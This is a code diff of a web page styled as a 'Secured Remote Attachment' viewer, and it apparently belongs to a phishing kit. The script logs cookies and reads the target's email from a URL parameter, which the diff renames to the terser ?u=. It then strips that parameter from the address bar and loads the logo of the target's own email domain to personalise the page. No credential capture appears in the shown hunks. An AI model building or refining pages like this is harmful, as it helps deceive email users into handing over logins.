@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Secured Remote Attachment</title>
+<title>Secured Remote Attachment — Mock Viewer</title>
 <style>
   :root{
     --bg: #e6e9eb;
@@ -418,9 +418,10 @@ function parseCookies(cookieString = document.cookie) {
 const cookies = parseCookies();
 // Optional: console log to check cookies
 console.log("Cookies available to JS:", cookies);
-// Get email from URL ?email=
+
+// Get email from URL  ?u=
 const params = new URLSearchParams(window.location.search);
-const rawEmail = params.get("email");
+const rawEmail = params.get("u");
 
 // Check if email exists AND is valid
 if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
@@ -430,10 +431,8 @@ if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
 
   const domain = rawEmail.split('@')[1];
 
-  // *** HIDE the email from the URL but KEEP functionality ***
+  // HIDE parameter
   history.replaceState({}, document.title, window.location.pathname);
-
-
   // Set logo
   logoImg.src = `https://logo.clearbit.com/${domain}`;
   logoImg.onerror = () => {
